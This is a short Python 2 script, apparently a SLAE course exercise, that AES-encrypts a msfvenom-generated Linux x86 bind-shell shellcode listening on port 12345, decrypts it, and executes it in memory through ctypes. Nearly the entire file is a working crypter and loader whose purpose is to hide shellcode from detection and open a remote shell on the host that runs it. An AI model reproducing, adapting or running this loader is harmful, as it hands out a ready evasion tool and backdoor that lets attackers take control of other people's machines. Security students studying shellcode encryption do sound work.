#!/usr/bin/python
#Author: Zoltan Balazs
#SLAE 607

from ctypes import *

from Crypto.Cipher import AES
import base64
import os


def print_shellcode(shellcode):
        encoded = ""
        for x in bytearray(shellcode):
                value = x
                encoded += '\\x'
                encoded += '%02x' % value
        print encoded

BLOCK_SIZE = 32

PADDING = '{'

pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

EncryptAES = lambda c, s: c.encrypt(pad(s))
DecryptAES = lambda c, e: c.decrypt(e).rstrip(PADDING)

#secret = base64.b64encode(os.urandom(BLOCK_SIZE))
secret = (base64.b64decode("7dXwb5giAn7bJGp1VNfmu29oDK2r0mUkEEf9gVrtRE4="))

cipher = AES.new(secret)

#output of msfvenom -p linux/x86/shell_bind_tcp -f python -e x86/shikata_ga_nai LPORT=12345
buf =  ""
buf += "\xb8\x35\x93\x35\x4b\xda\xc6\xd9\x74\x24\xf4\x5f\x2b"
buf += "\xc9\xb1\x14\x83\xef\xfc\x31\x47\x10\x03\x47\x10\xd7"
buf += "\x66\x04\x90\xe0\x6a\x34\x65\x5d\x07\xb9\xe0\x80\x67"
buf += "\xdb\x3f\xc2\xd3\x7a\x92\xaa\xe1\x82\x22\x13\x8c\x92"
buf += "\x13\x33\xd9\x72\xf9\xd5\x81\xb9\x7e\x90\x73\x46\xcc"
buf += "\xa6\xc3\x20\xff\x26\x60\x1d\x99\xeb\xe7\xce\x3f\x99"
buf += "\xd8\xa8\x72\xdd\x6e\x30\x75\xb5\x5f\xed\xf6\x2d\xc8"
buf += "\xde\x9a\xc4\x66\xa8\xb8\x46\x24\x23\xdf\xd6\xc1\xfe"
buf += "\xa0"

# encrypt a string
encrypted_shellcode = EncryptAES(cipher, buf)

print 'Encrypted shellcode ...'
print_shellcode(encrypted_shellcode)

# decrypt the encrypted string
decrypted = DecryptAES(cipher, encrypted_shellcode)

print 'Decrypted shellcode ...'
print_shellcode(decrypted)

memorywithshell = create_string_buffer(decrypted, len(decrypted))
print (len(decrypted))
shellcode = cast(memorywithshell, CFUNCTYPE(c_void_p))

shellcode()
